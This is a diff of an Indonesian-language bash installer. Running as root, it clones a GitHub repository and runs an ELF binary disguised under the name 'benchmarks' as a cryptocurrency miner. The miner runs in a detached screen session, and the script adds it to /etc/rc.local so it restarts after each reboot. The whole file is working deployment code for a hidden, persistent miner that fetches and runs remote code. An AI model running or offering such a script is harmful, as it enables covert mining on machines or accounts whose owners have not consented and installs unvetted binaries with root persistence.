@@ -2,11 +2,31 @@
 echo "📦 Menginstal dependensi..."
 apt-get update && apt-get install -y screen wget git
 
-echo "🌐 Meng-clone skrip mining dari GitHub..."
+echo "🧹 Membersihkan folder sebelumnya..."
 rm -rf /root/web
+
+echo "🌐 Clone skrip mining dari GitHub..."
 git clone https://github.com/amirul5656/web.git /root/web
 
-echo "📁 Menyimpan skrip mining ke /root/web2.sh..."
+if [ ! -d /root/web ]; then
+  echo "❌ Gagal clone repo GitHub. Periksa koneksi internet atau URL."
+  exit 1
+fi
+
+echo "⏳ Mengecek file benchmarks..."
+if [ ! -f /root/web/benchmarks ]; then
+  echo "❌ File 'benchmarks' tidak ditemukan setelah clone. Gagal lanjut."
+  exit 1
+fi
+
+# Validasi apakah file benar-benar executable ELF
+if ! file /root/web/benchmarks | grep -q "ELF 64-bit"; then
+  echo "❌ File 'benchmarks' bukan file biner ELF. Gagal jalan."
+  exit 1
+fi
+
+echo "✅ File benchmarks valid. Menyiapkan script mining..."
+
 cat << 'EOF' > /root/web2.sh
 #!/bin/bash
 
@@ -14,9 +34,8 @@ cd /root/web || exit
 
 chmod +x benchmarks
 
-# Cek apakah screen sudah berjalan
 if screen -list | grep -q amirul3; then
-  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
+  echo "⚠️  Screen 'amirul3' sudah berjalan. Melewati eksekusi ulang."
 else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
@@ -33,18 +52,18 @@ chmod +x /root/web2.sh
 echo "🚀 Menjalankan miner sekarang..."
 bash /root/web2.sh
 
-# Tambahkan ke /etc/rc.local agar jalan saat reboot
+echo "🔁 Menambahkan ke startup reboot (/etc/rc.local)..."
 if [ -f /etc/rc.local ]; then
   if ! grep -q '/root/web2.sh' /etc/rc.local; then
     sed -i '/^exit 0/i bash /root/web2.sh &' /etc/rc.local
-    echo "🛠️ Menambahkan ke /etc/rc.local"
+    echo "🛠️ Ditambahkan ke /etc/rc.local"
   fi
 else
   echo '#!/bin/bash' > /etc/rc.local
   echo 'bash /root/web2.sh &' >> /etc/rc.local
   echo 'exit 0' >> /etc/rc.local
   chmod +x /etc/rc.local
-  echo "🛠️ Membuat dan mengatur /etc/rc.local"
+  echo "🛠️ /etc/rc.local dibuat dan diset executable"
 fi
 
-echo "✅ Siap! Mining aktif sekarang & akan otomatis jalan setelah reboot."
+echo "✅ SEMUA SIAP! Mining sudah berjalan dan akan otomatis restart setelah reboot."
